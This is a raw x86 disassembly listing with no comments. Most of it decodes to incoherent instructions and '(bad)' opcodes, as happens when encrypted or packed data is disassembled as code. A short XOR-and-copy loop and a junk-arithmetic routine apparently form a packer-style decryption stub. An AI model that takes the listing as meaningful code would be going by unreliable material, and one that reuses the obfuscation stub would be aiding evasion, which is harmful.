  4030da:	and    ebx,DWORD PTR [eax-0x297ef892]
  4030e0:	or     bh,BYTE PTR [esi-0x63]
  4030e3:	fnstsw WORD PTR [ecx-0x25]
  4030e6:	sar    ah,0x60
  4030e9:	fnstenv [ebx]
  4030eb:	jae    0x4030e0
  4030ed:	jmp    0xa080:0xc903682c
  4030f4:	ficomp WORD PTR [ebx]
  4030f6:	inc    ebp
  4030f7:	adc    DWORD PTR [esi-0x678eb0f1],esi
  4030fd:	(bad)  
  4030fe:	xor    dh,ah
  403100:	(bad)  
  403101:	jp     0x4030ed
  403103:	xchg   ebp,eax
  403104:	mov    es,WORD PTR [ecx+0x5cc29032]
  40310a:	das    
  40310b:	sbb    eax,0x4a9d5d61
  403110:	push   edx
  403111:	or     eax,DWORD PTR [edx+0x48]
  403114:	and    dl,BYTE PTR [ecx]
  403116:	das    
  403117:	and    al,0xc6
  403119:	jge    0x40315d
  40311b:	jg     0x4030a8
  40311d:	imul   edx,DWORD PTR [esi],0x26
  403120:	icebp  
  403121:	push   edx
  403122:	sub    BYTE PTR [edx-0xc9a10ec],bl
  403128:	mov    ds:0x90c52df7,eax
  40312d:	fbstp  TBYTE PTR [eax]
  40312f:	adc    cl,BYTE PTR [esi+ebx*2-0x5b]
  403133:	push   ds
  403134:	or     ebx,DWORD PTR [ebx+0x29fc7cb3]
  40313a:	je     0x403183
  40313c:	dec    esi
  40313d:	push   ds
  40313e:	mov    edi,0x5e74522b
  403143:	aad    0x58
  403145:	mov    bh,0x9b
  403147:	add    BYTE PTR [esi-0x7ccd082e],ah
  40314d:	xchg   esi,eax
  40314e:	jg     0x40314b
  403150:	lock and dh,ch
  403153:	pop    edx
  403154:	sub    ah,ch
  403156:	sar    DWORD PTR [ecx+0x39ba78f0],cl
  40315c:	or     BYTE PTR [esp+edi*1],ch
  40315f:	(bad)  
  403160:	jmp    0x4713:0xdfe4a901
  403167:	stc    
  403168:	cli    
  403169:	bnd lock js 0x40310a
  40316d:	rcr    DWORD PTR [edi+eax*2+0x72],1
  403171:	push   ss
  403172:	mov    dl,0x95
  403174:	push   ecx
  403175:	inc    esp
  403176:	icebp  
  403177:	sbb    eax,0x1b82a486
  40317c:	add    BYTE PTR [ebx],bh
  40317e:	arpl   WORD PTR [edx-0x36e6cafd],bp
  403184:	stc    
  403185:	or     eax,0x7e6f16cc
  40318a:	(bad)  
  40318b:	cmp    eax,0xe03a1266
  403190:	add    cl,dh
  403192:	retf   
  403193:	mov    al,ds:0xd71ad0b3
  403198:	xchg   DWORD PTR [eax+ecx*8],ecx
  40319b:	or     BYTE PTR [ebx+ebp*4],ch
  40319e:	sub    bl,BYTE PTR [edi-0x63]
  4031a1:	sub    esp,0x7d
  4031a4:	outs   dx,DWORD PTR ds:[esi]
  4031a5:	fisubr DWORD PTR [ebx]
  4031a7:	and    edx,DWORD PTR [ebx-0x1949552]
  4031ad:	retf   
  4031ae:	lods   eax,DWORD PTR ds:[esi]
  4031af:	adc    ecx,ebp
  4031b1:	push   ebx
  4031b2:	xchg   ebp,eax
  4031b3:	aam    0xe2
  4031b5:	push   edi
  4031b6:	test   eax,0x6fa97570
  4031bb:	mov    BYTE PTR [ebx],dl
  4031bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4031be:	mov    ecx,0x26a734ce
  4031c3:	nop
  4031c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4031c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4031c6:	lds    edx,FWORD PTR [edx]
  4031c8:	xor    ch,bh
  4031ca:	sub    ecx,DWORD PTR [ecx-0x644dbeda]
  4031d0:	fisubr DWORD PTR [ebp+0x65a459f3]
  4031d6:	out    dx,eax
  4031d7:	js     0x403213
  4031d9:	push   0xa40317d2
  4031de:	ror    edi,0x53
  4031e1:	icebp  
  4031e2:	push   esp
  4031e3:	mov    DWORD PTR [eax-0x2e14f778],esp
  4031e9:	cwde   
  4031ea:	jmp    0xed07afc4
  4031ef:	mov    ecx,DWORD PTR [edi]
  4031f1:	pushf  
  4031f2:	loopne 0x4031d4
  4031f4:	mov    ecx,0xc3743010
  4031f9:	repnz pop edx
  4031fb:	pop    ebx
  4031fc:	out    0xfb,eax
  4031fe:	mov    es,WORD PTR [eax-0x6a726a0b]
  403204:	rol    DWORD PTR [eax],cl
  403206:	pop    ebp
  403207:	pop    es
  403208:	push   ebp
  403209:	aad    0x43
  40320b:	sbb    ebp,edx
  40320d:	repnz ins BYTE PTR es:[edi],dx
  40320f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403210:	xor    BYTE PTR [esi],ch
  403212:	pop    esp
  403213:	lahf   
  403214:	js     0x40322b
  403216:	scas   al,BYTE PTR es:[edi]
  403217:	xor    DWORD PTR [edx],ebp
  403219:	mov    ah,0xf4
  40321b:	inc    eax
  40321c:	jbe    0x403238
  40321e:	arpl   WORD PTR [ebx-0x39],cx
  403221:	pusha  
  403222:	hlt    
  403223:	popf   
  403224:	repz mul BYTE PTR [eax-0x76]
  403228:	test   BYTE PTR [eax-0x382f4d4f],ah
  40322e:	cmp    eax,0xbc1c9814
  403233:	sahf   
  403234:	push   ebp
  403235:	popf   
  403236:	pop    ss
  403237:	test   eax,0x544e4670
  40323c:	retf   
  40323d:	adc    DWORD PTR [edi+ecx*4-0x7d],ecx
  403241:	or     BYTE PTR [eax],bl
  403243:	clc    
  403244:	mov    ds:0x8b0183fa,eax
  403249:	pop    es
  40324a:	xor    BYTE PTR [edi+esi*1],cl
  40324d:	sub    edi,DWORD PTR [edx]
  40324f:	push   eax
  403250:	mov    ebp,DWORD PTR [esi-0x108d04a7]
  403256:	popa   
  403257:	xchg   DWORD PTR [esi+0x70],ebx
  40325a:	popf   
  40325b:	loopne 0x4032b8
  40325d:	mov    ebp,0x509b1a5a
  403262:	cli    
  403263:	outs   dx,BYTE PTR ds:[esi]
  403264:	mov    esp,0xc1c17f44
  403269:	jge    0x4032e8
  40326b:	pop    ds
  40326c:	add    eax,0x7fb6900e
  403271:	inc    edi
  403272:	jnp    0x403242
  403274:	xor    BYTE PTR [edx-0x33cabff0],cl
  40327a:	(bad)  
  40327b:	stc    
  40327c:	iret   
  40327d:	inc    ebx
  40327e:	outs   dx,BYTE PTR ds:[esi]
  40327f:	dec    ebp
  403280:	sub    BYTE PTR [edi-0x1dacab97],bh
  403286:	dec    esp
  403287:	dec    edx
  403288:	ins    DWORD PTR es:[edi],dx
  403289:	cdq    
  40328a:	mov    cl,0xa1
  40328c:	inc    ecx
  40328d:	sbb    eax,0xc62a8146
  403292:	call   0x7ff1:0x43427c7c
  403299:	(bad)  
  40329a:	xchg   ebp,eax
  40329b:	jge    0x40327c
  40329d:	mov    ebp,0x28df065
  4032a2:	(bad)  
  4032a3:	hlt    
  4032a4:	ds mov ch,0xf4
  4032a7:	mov    cl,BYTE PTR [eax+0x5a]
  4032aa:	push   esp
  4032ab:	cmp    eax,0x63a348ba
  4032b0:	push   0xabfa3dcf
  4032b5:	inc    ecx
  4032b6:	retf   0xf6f0
  4032b9:	jle    0x403281
  4032bb:	jb     0x4032d9
  4032bd:	adc    eax,0xa76a43e7
  4032c2:	clc    
  4032c3:	push   ds
  4032c4:	sub    edx,edx
  4032c6:	int    0x53
  4032c8:	push   es
  4032c9:	pop    edi
  4032ca:	xor    DWORD PTR [edx-0x6a],edx
  4032cd:	adc    eax,0x9b39535
  4032d2:	test   eax,0xbf3de02c
  4032d7:	inc    ebp
  4032d8:	lea    ebp,[esi+eiz*8-0x7dee9d49]
  4032df:	mov    BYTE PTR [edi+0x114e0caf],ah
  4032e5:	test   BYTE PTR [edx-0x304001b8],bl
  4032eb:	jmp    0x1981:0xe1f1806e
  4032f2:	popa   
  4032f3:	ds test al,0x9f
  4032f6:	(bad)  
  4032f8:	pop    eax
  4032f9:	enter  0x8f82,0xfd
  4032fd:	popf   
  4032fe:	rol    edi,cl
  403300:	or     ebx,DWORD PTR [esi+eax*8+0x77]
  403304:	cmp    al,0x31
  403306:	shl    ecx,cl
  403308:	pop    eax
  403309:	sbb    bh,al
  40330b:	mov    al,0xa6
  40330d:	mov    ecx,0x13332df1
  403312:	in     al,0x41
  403314:	int    0x5d
  403316:	in     al,0x48
  403318:	pop    ds
  403319:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40331a:	inc    ecx
  40331b:	sub    eax,0xffbd4d
  403320:	fisub  WORD PTR [edx]
  403322:	adc    eax,0xfa7fe4ae
  403327:	in     eax,0xdf
  403329:	push   esp
  40332a:	ret    0x3b7c
  40332d:	cmp    BYTE PTR [edx+0x74f7b362],ch
  403333:	lds    edx,FWORD PTR [ebp+0x15]
  403336:	dec    eax
  403337:	xor    eax,0xa07a7264
  40333c:	dec    ecx
  40333d:	setae  BYTE PTR [edi-0x15799298]
  403344:	(bad)  
  403345:	and    eax,0x31647f97
  40334a:	push   es
  40334b:	in     eax,0x62
  40334d:	jmp    0x4032f8
  40334f:	sub    eax,0xe583edef
  403354:	xor    al,0x92
  403356:	mov    esp,0x2ba0e39
  40335b:	or     DWORD PTR [edx-0x19],esi
  40335e:	and    ah,bh
  403360:	fidiv  WORD PTR [eax]
  403362:	in     al,dx
  403363:	ins    BYTE PTR es:[edi],dx
  403364:	sub    ch,BYTE PTR [ebx-0x29]
  403367:	or     ebp,ebp
  403369:	push   0x658df823
  40336e:	ins    DWORD PTR es:[edi],dx
  40336f:	fs jle 0x403304
  403372:	xchg   BYTE PTR [ecx+0x26c09e9],bh
  403378:	ficom  DWORD PTR [ecx+0x2441f260]
  40337e:	xor    al,0x66
  403380:	mov    DWORD PTR [ebp-0xb],edi
  403383:	sbb    ecx,DWORD PTR [eax]
  403385:	pop    ebx
  403386:	mov    al,0xda
  403388:	stos   BYTE PTR es:[edi],al
  403389:	mov    esp,0x5361f13
  40338e:	test   al,0x27
  403390:	ins    DWORD PTR es:[edi],dx
  403391:	mov    ebx,0x672b6c6d
  403396:	mov    WORD PTR [edi+edi*4+0x758b307a],gs
  40339d:	or     BYTE PTR [edi],cl
  40339f:	scas   eax,DWORD PTR es:[edi]
  4033a0:	cli    
  4033a1:	mov    ebx,DWORD PTR [ebp+0xc]
  4033a4:	xor    eax,ecx
  4033a6:	add    eax,edx
  4033a8:	jmp    0x403687
  4033ad:	jecxz  0x4033d3
  4033af:	fcom   DWORD PTR [edx]
  4033b1:	out    0xd2,eax
  4033b3:	icebp  
  4033b4:	icebp  
  4033b5:	pop    es
  4033b6:	xchg   edx,eax
  4033b7:	aaa    
  4033b8:	aas    
  4033b9:	iret   
  4033ba:	aam    0x6a
  4033bc:	push   esi
  4033bd:	cmp    dl,BYTE PTR [eax+esi*2]
  4033c0:	jo     0x403380
  4033c2:	jle    0x403434
  4033c4:	jo     0x4033e9
  4033c6:	and    ch,cl
  4033c8:	lds    ebp,FWORD PTR [edi]
  4033ca:	bound  esp,QWORD PTR [edi-0x2bca2d89]
  4033d0:	fdivr  st(7),st
  4033d2:	push   edi
  4033d3:	push   eax
  4033d4:	mov    bl,0xf7
  4033d6:	mov    bl,0xb2
  4033d8:	inc    esp
  4033d9:	mov    eax,ds:0xde027a61
  4033de:	leave  
  4033df:	fs loop 0x40344b
  4033e2:	cmp    BYTE PTR [edx],cl
  4033e4:	cmp    al,0x57
  4033e6:	(bad)  
  4033e7:	xchg   edx,eax
  4033e8:	fist   WORD PTR [esi-0x50]
  4033eb:	sub    BYTE PTR [ecx],al
  4033ed:	or     eax,0xc2a29bca
  4033f2:	adc    edi,DWORD PTR [esp+eiz*2+0x70]
  4033f6:	fmul   QWORD PTR [ecx-0x5e]
  4033f9:	xchg   ecx,eax
  4033fa:	inc    ecx
  4033fb:	mov    bh,0xf1
  4033fd:	ss xchg ebx,eax
  4033ff:	jb     0x4033d3
  403401:	call   0x51980ffe
  403406:	fistp  WORD PTR [ebp-0x24]
  403409:	jno    0x403449
  40340b:	(bad)  
  40340c:	dec    ecx
  40340d:	mov    esp,0x92eefe69
  403412:	push   0xc
  403414:	mov    cl,0x36
  403416:	aas    
  403417:	loopne 0x403487
  403419:	and    eax,0xcc1490d8
  40341e:	add    eax,0xbe010718
  403423:	nop
  403424:	xor    BYTE PTR [esi],dl
  403426:	hlt    
  403427:	lahf   
  403428:	or     DWORD PTR [ebp+0x60],ecx
  40342b:	jmp    0xcba7:0xe0ee13a3
  403432:	fld    QWORD PTR [edi-0x78d2a079]
  403438:	mov    BYTE PTR [eax+0x4c],al
  40343b:	test   eax,0x9002f09e
  403440:	(bad)  [edx+0x4]
  403443:	push   0xffffffc6
  403445:	xchg   ecx,eax
  403446:	mov    es,WORD PTR ss:[esi+0x1d]
  40344a:	out    0xc7,al
  40344c:	int    0xf6
  40344e:	xchg   edi,eax
  40344f:	and    bh,BYTE PTR [ebp-0x64]
  403452:	mov    ds:0x5e6e0842,al
  403457:	jo     0x403492
  403459:	iret   
  40345a:	push   cs
  40345b:	cmp    eax,0xadbfcc34
  403460:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403461:	(bad)  
  403462:	fcmovne st,st(4)
  403464:	jbe    0x403470
  403466:	and    al,0x9d
  403468:	jbe    0x4034e9
  40346a:	mov    eax,0xe10d9999
  40346f:	enter  0xa85c,0xf4
  403473:	stc    
  403474:	ja     0x40345a
  403476:	lds    ebx,FWORD PTR [ebx-0x5]
  403479:	xchg   edx,eax
  40347a:	cmp    bh,al
  40347c:	neg    DWORD PTR [edx]
  40347e:	mov    edi,0xb7ce157c
  403483:	test   BYTE PTR [edx-0x78a27dfa],0xce
  40348a:	mov    dl,0xce
  40348c:	(bad)  
  40348d:	repnz xor eax,0x88b7275d
  403493:	pusha  
  403494:	mov    DWORD PTR [ecx],edx
  403496:	fist   WORD PTR [ecx]
  403498:	idiv   DWORD PTR [edx+eax*8-0x4b0ff8de]
  40349f:	mov    al,0x9e
  4034a1:	cmp    al,BYTE PTR [edx-0x4a]
  4034a4:	fldenv [esi+eiz*2+0x14]
  4034a8:	lahf   
  4034a9:	fcomp  QWORD PTR [edx+eiz*4]
  4034ac:	fnsave [edi+0x3251ddb9]
  4034b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4034b3:	jb     0x403513
  4034b5:	stc    
  4034b6:	lds    ebx,FWORD PTR [edi+0x14e303a8]
  4034bc:	mov    al,dh
  4034be:	jo     0x403451
  4034c0:	cmp    BYTE PTR [ebp+0x1e6333de],dl
  4034c6:	outs   dx,DWORD PTR ds:[esi]
  4034c7:	ins    DWORD PTR es:[edi],dx
  4034c8:	push   ebx
  4034c9:	xchg   esi,eax
  4034ca:	daa    
  4034cb:	lods   al,BYTE PTR ds:[esi]
  4034cc:	and    DWORD PTR [eax-0x3f],esi
  4034cf:	push   ebp
  4034d0:	jnp    0x4034c8
  4034d2:	int3   
  4034d3:	dec    edx
  4034d4:	xchg   ebx,eax
  4034d5:	mov    edx,0x4f00643b
  4034da:	ja     0x40347e
  4034dc:	hlt    
  4034dd:	ficom  DWORD PTR [ebx-0x6f]
  4034e0:	xor    eax,0x50f59c9b
  4034e5:	mov    DWORD PTR [esi-0x2db324da],ebx
  4034eb:	aam    0x3f
  4034ed:	mov    dl,0xd9
  4034ef:	int    0x4d
  4034f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4034f2:	and    DWORD PTR [edi],ecx
  4034f4:	jl     0x403568
  4034f6:	push   edx
  4034f7:	push   edi
  4034f8:	jp     0x4034ec
  4034fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4034fb:	mov    esi,0xfc27e5cb
  403500:	repnz add ebx,DWORD PTR [esi+0x232be639]
  403507:	mov    ds:0x9cbad98,eax
  40350c:	push   ss
  40350d:	fist   WORD PTR [esi+0x37e02bae]
  403513:	test   ch,al
  403515:	clc    
  403516:	adc    al,0xc6
  403518:	iret   
  403519:	in     eax,dx
  40351a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40351b:	mov    dl,BYTE PTR [edx]
  40351d:	scas   al,BYTE PTR es:[edi]
  40351e:	jbe    0x40350b
  403520:	ret    0x4c2d
  403523:	popf   
  403524:	rol    DWORD PTR [edx-0x3c],0x77
  403528:	mov    edx,0x511a0fac
  40352d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40352e:	out    0x83,al
  403530:	or     esp,DWORD PTR [ebp+0x79]
  403533:	sub    DWORD PTR [esi+0x45],esp
  403536:	and    ebp,ecx
  403538:	pop    ebp
  403539:	lea    edi,[edi+0x38]
  40353c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40353d:	push   ebx
  40353e:	push   eax
  40353f:	or     DWORD PTR [esi+0x13f1914f],0x38006d7f
  403549:	in     al,dx
  40354a:	pop    ss
  40354b:	or     al,0x96
  40354d:	(bad)  
  40354e:	cmp    eax,0x53cf687c
  403553:	shr    BYTE PTR [edi],0xaf
  403556:	fwait
  403557:	cmp    dl,BYTE PTR [esi]
  403559:	clc    
  40355a:	lahf   
  40355b:	and    eax,0x7b659b90
  403560:	xchg   esi,eax
  403561:	xor    al,0x25
  403563:	cmp    al,0x3c
  403565:	jbe    0x403504
  403567:	sbb    DWORD PTR [ecx-0x77b6c77],0xfaf4e6d6
  403571:	into   
  403572:	cmp    dh,BYTE PTR [ebx]
  403574:	int3   
  403575:	or     dl,0xcb
  403578:	xor    al,ah
  40357a:	bound  esi,QWORD PTR [ebx-0x7]
  40357d:	jmp    0x4035d4
  40357f:	xchg   ebx,eax
  403580:	addr16 popf 
  403582:	ja     0x403507
  403584:	movhps QWORD PTR [ecx-0x1f],xmm1
  403588:	enter  0x7725,0x3e
  40358c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40358d:	inc    ebx
  40358e:	scas   al,BYTE PTR es:[edi]
  40358f:	xchg   ebx,eax
  403590:	leave  
  403591:	jns    0x403562
  403593:	xor    ebp,edi
  403595:	in     eax,dx
  403596:	mov    ebp,ebx
  403598:	jno    0x403596
  40359a:	(bad)  [edi+0x1a]
  40359d:	push   esi
  40359e:	jmp    0xac9e:0xa96c9bfb
  4035a5:	pop    eax
  4035a6:	je     0x4035b9
  4035a8:	test   DWORD PTR [edx+eax*4-0x70e2bc43],edx
  4035af:	cmp    ebp,DWORD PTR [eax+eiz*1+0x7c]
  4035b3:	in     al,0xcc
  4035b5:	dec    esi
  4035b6:	ins    BYTE PTR es:[edi],dx
  4035b7:	inc    esi
  4035b8:	jl     0x403617
  4035ba:	mov    cl,0xe4
  4035bc:	mov    bl,0x67
  4035be:	xor    DWORD PTR [edi+0x510210c3],ecx
  4035c4:	loop   0x4035d7
  4035c6:	outs   dx,BYTE PTR ds:[esi]
  4035c7:	jecxz  0x403603
  4035c9:	or     ah,cl
  4035cb:	imul   edx,DWORD PTR [edi],0xffffff9f
  4035ce:	jne    0x403561
  4035d0:	lock or DWORD PTR [esi+0x2a],eax
  4035d4:	cmp    al,BYTE PTR [ecx+0x4d8721ca]
  4035da:	clc    
  4035db:	and    DWORD PTR [edx],ebp
  4035dd:	and    BYTE PTR ds:0xde956243,cl
  4035e3:	data16 xor ch,dh
  4035e6:	xchg   ebx,eax
  4035e7:	mov    DWORD PTR [eax+0x2b],esi
  4035ea:	test   BYTE PTR [eax],dh
  4035ec:	push   cs
  4035ed:	fldenv [esi]
  4035ef:	test   BYTE PTR [esi+0xaeed0aa],0xf6
  4035f6:	test   eax,0x6fef152b
  4035fb:	imul   ebx,edx,0xca7e6b18
  403601:	ins    DWORD PTR es:[edi],dx
  403602:	or     eax,0xbb5a3a79
  403607:	xor    eax,0xc0f26570
  40360c:	stos   BYTE PTR es:[edi],al
  40360d:	ja     0x403665
  40360f:	jp     0x403593
  403611:	jl     0x403665
  403613:	addr16 mov ch,0xf9
  403616:	push   esi
  403617:	xchg   esi,eax
  403618:	add    bl,ch
  40361a:	lock scas eax,DWORD PTR es:[edi]
  40361c:	pop    esp
  40361d:	inc    edx
  40361e:	or     esp,edi
  403620:	cs test al,0xc2
  403623:	fst    QWORD PTR [ecx]
  403625:	fidivr WORD PTR [eax]
  403627:	mov    eax,0x9785cc95
  40362c:	mov    edi,0x4bd43868
  403631:	js     0x403648
  403633:	stc    
  403634:	inc    ebx
  403635:	cmp    edx,ecx
  403637:	outs   dx,DWORD PTR ds:[esi]
  403638:	or     al,0x8f
  40363a:	cli    
  40363b:	leave  
  40363c:	mov    ebx,0xd0f9b7d5
  403641:	sbb    eax,0xca574af1
  403646:	pop    es
  403647:	inc    ebx
  403648:	mov    bl,0x19
  40364a:	mov    ds:0xdd6c5fa,eax
  40364f:	push   edi
  403650:	jecxz  0x403619
  403652:	push   esp
  403653:	mov    ecx,DWORD PTR fs:[edx-0x72]
  403657:	adc    BYTE PTR [esi+ebp*8],dl
  40365a:	mov    al,ds:0x5892897d
  40365f:	mov    ch,bl
  403661:	es scas eax,DWORD PTR es:[edi]
  403663:	not    BYTE PTR [esi+0x4e]
  403666:	cmp    al,0xed
  403668:	xor    BYTE PTR [eax+0x27],bl
  40366b:	sti    
  40366c:	cwde   
  40366d:	add    dh,dh
  40366f:	ret    
  403670:	aaa    
  403671:	dec    eax
  403672:	pop    eax
  403673:	mov    edx,0xf2b88598
  403678:	sub    edx,esp
  40367a:	jb     0x403688
  40367c:	push   ss
  40367d:	jg     0x40369a
  40367f:	cs fs int3 
  403682:	mov    WORD PTR [esi],ds
  403684:	mul    DWORD PTR [ebx]
  403686:	inc    ebp
  403687:	mov    al,BYTE PTR [ebx+eax*1+0x32729c]
  40368e:	mov    BYTE PTR [edi+esi*1],al
  403691:	mov    eax,DWORD PTR [ebp-0x4]
  403694:	xor    eax,ecx
  403696:	lea    edx,[edx+eax*1+0x32729c]
  40369d:	mov    eax,DWORD PTR [ebp-0x4]
  4036a0:	xor    eax,ecx
  4036a2:	mov    esi,0xffcd8d64
  4036a7:	sub    esi,eax
  4036a9:	add    esi,DWORD PTR [ebp+0x10]
  4036ac:	cmp    edx,esi
  4036ae:	jbe    0x4030ad
  4036b4:	pop    ebx
  4036b5:	mov    eax,0xf89c8530
  4036ba:	pop    edi
  4036bb:	pop    esi
  4036bc:	leave  
  4036bd:	ret    0xc
  4036c0:	push   ebp
  4036c1:	mov    ebp,esp
  4036c3:	sub    esp,0x58
  4036c6:	mov    DWORD PTR ds:0x42fced,0x17
  4036d0:	cmp    DWORD PTR ds:0x42fced,0x0
  4036d7:	je     0x40372c
  4036dd:	cmp    DWORD PTR ds:0x42fced,0x7
  4036e4:	jne    0x4036fc
  4036ea:	push   0x0
  4036ec:	push   0x25f8
  4036f1:	push   0x8523
  4036f6:	call   DWORD PTR ds:0x42e2d7
  4036fc:	cmp    DWORD PTR ds:0x42fced,0x8
  403703:	jne    0x403717
  403709:	xor    eax,eax
  40370b:	or     eax,DWORD PTR ds:0x42fced
  403711:	dec    eax
  403712:	mov    ds:0x42fced,eax
  403717:	mov    eax,ds:0x42fced
  40371c:	dec    eax
  40371d:	mov    ds:0x42fced,eax
  403722:	jmp    0x4036d0
  403727:	adc    eax,0xdf
  40372c:	mov    ecx,DWORD PTR [ebp+0x8]
  40372f:	add    DWORD PTR ds:0x42e6f3,0x693e
  403739:	mov    eax,0x8a3e
  40373e:	adc    DWORD PTR ds:0x42e6f7,0x5ea2
  403748:	xor    ax,WORD PTR [ecx+0x20]
  40374c:	adc    DWORD PTR ds:0x42fd0d,ecx
  403752:	mov    ecx,0x3b04
  403757:	and    DWORD PTR ds:0x42e713,0x42e11c
  403761:	add    ax,cx
  403764:	mov    DWORD PTR ds:0x42fd7a,0x1b71
  40376e:	movzx  eax,ax
  403771:	mov    DWORD PTR [ebp-0xc],eax
  403774:	or     DWORD PTR ds:0x42e124,0x7677
  40377e:	mov    BYTE PTR [ebp-0x1],0x7f
  403782:	not    ecx
  403784:	lea    eax,[ebp-0x1]
  403787:	mov    DWORD PTR [ebp-0x10],eax
  40378a:	or     DWORD PTR ds:0x42e70f,ecx
  403790:	jmp    0x403af0
  403795:	out    0x52,eax
  403797:	out    0x78,al
  403799:	jno    0x40374f
  40379b:	in     eax,0x71
  40379d:	or     BYTE PTR [edx+0x68],bl
  4037a0:	and    eax,ecx
  4037a2:	mov    dl,0x77
  4037a4:	mov    eax,ds:0x70701178
  4037a9:	cmp    eax,0xfa70707d
  4037ae:	mov    ebx,0xd0097c04
  4037b3:	cli    
  4037b4:	mov    WORD PTR [ebx],ds
  4037b6:	xor    bl,BYTE PTR [edx+eiz*4-0x635b5f19]
  4037bd:	or     ecx,edx
  4037bf:	adc    bh,al
  4037c1:	mov    al,0xb4
  4037c3:	inc    edi
  4037c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4037c5:	(bad)  
  4037c6:	jno    0x40375f
  4037c8:	rol    BYTE PTR [ecx],0x82
  4037cb:	scas   eax,DWORD PTR es:[edi]
  4037cc:	cs loopne 0x40383e
  4037cf:	or     cl,BYTE PTR [eax+0x353c5f79]
  4037d5:	mov    esp,0x4df3105a
  4037da:	pop    ebp
  4037db:	in     eax,dx
  4037dc:	jecxz  0x4037cf
  4037de:	es jmp 0x21b2:0x406260f0
  4037e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4037e7:	fwait
  4037e8:	adc    dl,BYTE PTR [edx-0x5b]
  4037eb:	dec    edi
  4037ec:	clc    
  4037ed:	pop    edx
  4037ee:	bound  edx,QWORD PTR [ecx+eax*8+0x5d]
  4037f2:	and    esi,DWORD PTR [edx]
  4037f4:	mov    ch,0xfa
  4037f6:	sbb    dl,BYTE PTR [ebp+0x5]
  4037f9:	inc    ecx
  4037fa:	popf   
  4037fb:	out    dx,al
  4037fc:	cmp    ecx,DWORD PTR [ecx+0x2facb714]
  403802:	dec    ebp
  403803:	xchg   esp,eax
  403804:	jb     0x40387c
  403806:	cmp    BYTE PTR [ebx+0x65fd85cc],bl
  40380c:	iret   
  40380d:	mov    ah,0x47
  40380f:	jo     0x403824
  403811:	sbb    eax,0x169895e6
  403816:	aad    0xc7
  403818:	xchg   ebp,eax
  403819:	dec    edx
  40381a:	push   ss
  40381b:	push   ecx
  40381c:	cwde   
  40381d:	loopne 0x403883
  40381f:	add    eax,0x798be188
  403824:	test   al,bl
  403826:	cmp    ebx,DWORD PTR [esi+esi*2+0x60]
  40382a:	inc    esi
  40382b:	mov    ah,0x50
  40382d:	push   edx
  40382e:	pop    edi
  40382f:	(bad)  
  403830:	rcr    BYTE PTR [ebp-0x2af7132f],1
  403836:	and    al,0xc8
  403838:	scas   eax,DWORD PTR es:[edi]
  403839:	pop    ss
  40383a:	fst    QWORD PTR [edx-0x6e]
  40383d:	inc    cl
  40383f:	jmp    0xea541091
  403844:	ss cli 
  403846:	aaa    
  403847:	jmp    0xd38f46e8
  40384c:	mov    esp,0x8d317bf2
  403851:	pop    ds
  403852:	jo     0x40386c
  403854:	dec    ebx
  403855:	jg     0x403873
  403857:	xchg   DWORD PTR [eax+esi*1],ebp
  40385a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40385b:	jns    0x4038d8
  40385d:	adc    al,0xd3
  40385f:	arpl   sp,bx
  403861:	call   DWORD PTR [eax+ecx*4+0x7aa07229]
  403868:	and    al,0x19
  40386a:	jle    0x403888
  40386c:	mov    esp,0x576b0d74
  403871:	lea    eax,[esi+esi*4+0x115a06fb]
  403878:	icebp  
  403879:	push   ecx
  40387a:	sub    bl,BYTE PTR [esi+0x42cb9771]
  403880:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403881:	in     eax,dx
  403882:	sbb    DWORD PTR [edi-0x2016d23f],esi
  403888:	jle    0x4038b4
  40388a:	test   al,0xf7
  40388c:	cwde   
  40388d:	inc    ebp
  40388e:	lea    esp,[eax+0x5c75c6f8]
  403894:	jl     0x403819
  403896:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403897:	fldcw  WORD PTR [ebx-0x77]
  40389a:	jae    0x4038ee
  40389c:	out    0x48,eax
  40389e:	scas   eax,DWORD PTR es:[edi]
  40389f:	fs and edi,ebx
  4038a2:	sti    
  4038a3:	or     esp,DWORD PTR [ecx+0x1c]
  4038a6:	jmp    0x403854
  4038a8:	ror    DWORD PTR [eax+0x3],0x24
  4038ac:	outs   dx,DWORD PTR ds:[esi]
  4038ad:	arpl   ax,bx
  4038af:	les    edi,FWORD PTR [edx+eax*2-0x28]
  4038b3:	mov    ebp,esi
  4038b5:	inc    ebp
  4038b6:	je     0x40391e
  4038b8:	dec    esp
  4038b9:	sbb    al,BYTE PTR [eax+0x38]
  4038bc:	push   0xd189cfda
  4038c1:	pcmpeqd mm7,QWORD PTR ds:[ebp+edx*8+0x5d]
  4038c7:	repz gs fnstsw ax
  4038cb:	stos   BYTE PTR es:[edi],al
  4038cc:	ds jecxz 0x4038e7
  4038cf:	inc    edx
  4038d0:	inc    esp
  4038d1:	(bad)  
  4038d2:	mov    dh,0x4c
  4038d4:	jae    0x40385a
  4038d6:	pop    esi
  4038d7:	cmp    al,0x33
  4038d9:	push   edx
  4038da:	dec    ebp
  4038db:	sub    BYTE PTR [edx],0xc9
  4038de:	bound  ecx,QWORD PTR [eax+0x1479c599]
  4038e4:	mov    al,ds:0x1bfda81f
  4038e9:	sub    BYTE PTR [edi],bl
  4038eb:	retf   
  4038ec:	adc    dl,BYTE PTR [eax+0x46]
  4038ef:	adc    BYTE PTR [ebx],cl
  4038f1:	and    ah,BYTE PTR [ecx]
  4038f3:	fs pop edi
  4038f5:	cmp    DWORD PTR [edx],esi
  4038f7:	jge    0x4038c5
  4038f9:	cli    
  4038fa:	stos   DWORD PTR es:[edi],eax
  4038fb:	xchg   edi,eax
